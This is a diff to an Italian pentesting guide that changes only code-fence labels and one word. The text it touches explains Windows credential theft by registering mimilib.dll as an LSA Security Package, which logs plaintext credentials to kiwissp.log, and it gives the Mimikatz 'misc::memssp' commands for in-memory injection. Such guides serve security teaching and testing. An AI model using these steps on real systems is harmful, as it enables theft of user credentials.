@@ -19,15 +19,15 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Aggiungi `mimilib.dll` alla lista dei fornitori di supporto per la sicurezza (Pacchetti di sicurezza):
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 E dopo un riavvio, tutte le credenziali possono essere trovate in chiaro in `C:\Windows\System32\kiwissp.log`
 
 #### In memoria
 
-Puoi anche iniettare questo in memoria direttamente utilizzando Mimikatz (nota che potrebbe essere un po' instabile/non funzionare):
-```powershell
+Puoi anche iniettare questo in memoria direttamente usando Mimikatz (nota che potrebbe essere un po' instabile/non funzionare):
+```bash
 privilege::debug
 misc::memssp
 ```
